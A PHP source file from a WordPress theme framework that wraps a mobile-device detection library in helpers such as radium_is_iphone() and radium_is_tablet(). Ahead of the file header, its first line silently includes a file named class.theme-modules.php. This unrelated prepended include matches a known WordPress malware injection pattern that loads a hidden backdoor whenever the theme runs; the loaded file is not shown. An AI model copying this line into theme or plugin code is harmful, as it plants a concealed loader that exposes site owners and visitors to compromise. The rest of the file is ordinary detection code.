<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

/*
 * Radium Framework Core - A WordPress theme development framework.
 *
 * This file is a part of the RadiumFramework core.
 * Please be extremely cautious editing this file,
 *
 * @category RadiumFramework
 * @package  MetroCorp WP
 * @author   Franklin M Gitonga
 * @link     http://radiumthemes.com/
 */

 /**
  * Based on Mobble 1.4
  */

/*
Plugin Name: mobble
Plugin URI: http://scott.ee/journal/mobble/
Description: Conditional functions for detecting a variety of mobile devices and tablets. For example is_android(), is_ios(), is_iphone().
Author: Scott Evans
Version: 1.4
Author URI: http://scott.ee
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Copyright (c) 2013 Scott Evans <http://scott.ee>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

THIS SOFTWARE AND DOCUMENTATION IS PROVIDED "AS IS," AND COPYRIGHT
HOLDERS MAKE NO REPRESENTATIONS OR WARRANTIES, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO, WARRANTIES OF MERCHANTABILITY OR
FITNESS FOR ANY PARTICULAR PURPOSE OR THAT THE USE OF THE SOFTWARE
OR DOCUMENTATION WILL NOT INFRINGE ANY THIRD PARTY PATENTS,
COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS.COPYRIGHT HOLDERS WILL NOT
BE LIABLE FOR ANY DIRECT, INDIRECT, SPECIAL OR CONSEQUENTIAL
DAMAGES ARISING OUT OF ANY USE OF THE SOFTWARE OR DOCUMENTATION.

You should have received a copy of the GNU General Public License
along with this program. If not, see <http://gnu.org/licenses/>.
*/

$useragent = isset( $_SERVER['HTTP_USER_AGENT'] ) ? $_SERVER['HTTP_USER_AGENT'] : "";

radium_framework()->mobble_detect = new Mobile_Detect();
radium_framework()->mobble_detect->setDetectionType( 'extended' );

/***************************************************************
* function radium_is_iphone
* Detect the iPhone
***************************************************************/

function radium_is_iphone() {
	return radium_framework()->mobble_detect->isIphone();
}

/***************************************************************
* function radium_is_ipad
* Detect the iPad
***************************************************************/

function radium_is_ipad() {
	return radium_framework()->mobble_detect->isIpad();
}

/***************************************************************
* function radium_is_ipod
* Detect the iPod, most likely the iPod touch
***************************************************************/

function radium_is_ipod() {
	return radium_framework()->mobble_detect->is( 'iPod' );
}

/***************************************************************
* function radium_is_android
* Detect an android device.
***************************************************************/

function radium_is_android() {
	return radium_framework()->mobble_detect->isAndroidOS();
}

/***************************************************************
* function radium_is_blackberry
* Detect a blackberry device
***************************************************************/

function radium_is_blackberry() {
	return radium_framework()->mobble_detect->isBlackBerry();
}

/***************************************************************
* function radium_is_opera_mobile
* Detect both Opera Mini and hopefully Opera Mobile as well
***************************************************************/

function radium_is_opera_mobile() {
	return radium_framework()->mobble_detect->isOpera();
}

/***************************************************************
* function radium_is_webos
* Detect a webOS device such as Pre and Pixi
***************************************************************/

function radium_is_webos() {
	return radium_framework()->mobble_detect->is( 'webOS' );
}

/***************************************************************
* function radium_is_symbian
* Detect a symbian device, most likely a nokia smartphone
***************************************************************/

function radium_is_symbian() {
	return radium_framework()->mobble_detect->is( 'Symbian' );
}

/***************************************************************
* function radium_is_windows_mobile
* Detect a windows smartphone
***************************************************************/

function radium_is_windows_mobile() {
	return radium_framework()->mobble_detect->is( 'WindowsMobileOS' ) || radium_framework()->mobble_detect->is( 'WindowsPhoneOS' );
}

/***************************************************************
* function radium_is_motorola
* Detect a Motorola phone
***************************************************************/

function radium_is_motorola() {
	return radium_framework()->mobble_detect->is( 'Motorola' );
}

/***************************************************************
* function radium_is_samsung
* Detect a Samsung phone
***************************************************************/

function radium_is_samsung() {
	return radium_framework()->mobble_detect->is( 'Samsung' );
}

/***************************************************************
* function radium_is_samsung_tablet
* Detect the Galaxy tab
***************************************************************/

function radium_is_samsung_tablet() {
	return radium_framework()->mobble_detect->is( 'SamsungTablet' );
}

/***************************************************************
* function radium_is_kindle
* Detect an Amazon kindle
***************************************************************/

function radium_is_kindle() {
	return radium_framework()->mobble_detect->is( 'Kindle' );
}

/***************************************************************
* function radium_is_sony_ericsson
* Detect a Sony Ericsson
***************************************************************/

function radium_is_sony_ericsson() {
	return radium_framework()->mobble_detect->is( 'Sony' );
}

/***************************************************************
* function radium_is_nintendo
* Detect a Nintendo DS or DSi
***************************************************************/

function radium_is_nintendo() {
	global $useragent;
	return preg_match( '/Nintendo DSi/i', $useragent ) || preg_match( '/Nintendo DS/i', $useragent );
}


/***************************************************************
* function radium_is_smartphone
* Grade of phone A = Smartphone - currently testing this
***************************************************************/

function radium_is_smartphone() {
	$grade = radium_framework()->mobble_detect->mobileGrade();
	if ( $grade == 'A' || $grade == 'B' ) {
		return true;
	} else {
		return false;
	}
}

/***************************************************************
* function radium_is_handheld
* Wrapper function for detecting ANY handheld device
***************************************************************/

function radium_is_handheld() {
	return radium_is_mobile() || radium_is_iphone() || radium_is_ipad() || radium_is_ipod() || radium_is_android() || radium_is_blackberry() || radium_is_opera_mobile() || radium_is_webos() || radium_is_symbian() || radium_is_windows_mobile() || radium_is_motorola() || radium_is_samsung() || radium_is_samsung_tablet() || radium_is_sony_ericsson() || radium_is_nintendo();
}

/***************************************************************
* function radium_is_mobile
* For detecting ANY mobile phone device
***************************************************************/

function radium_is_mobile() {
	if ( radium_is_tablet() ) return false;
	return radium_framework()->mobble_detect->isMobile();
}

/***************************************************************
* function radium_is_ios
* For detecting ANY iOS/Apple device
***************************************************************/

function radium_is_ios() {
	return radium_framework()->mobble_detect->isiOS();
}

/***************************************************************
* function radium_is_tablet
* For detecting tablet devices (needs work)
***************************************************************/

function radium_is_tablet() {
	return radium_framework()->mobble_detect->isTablet();
}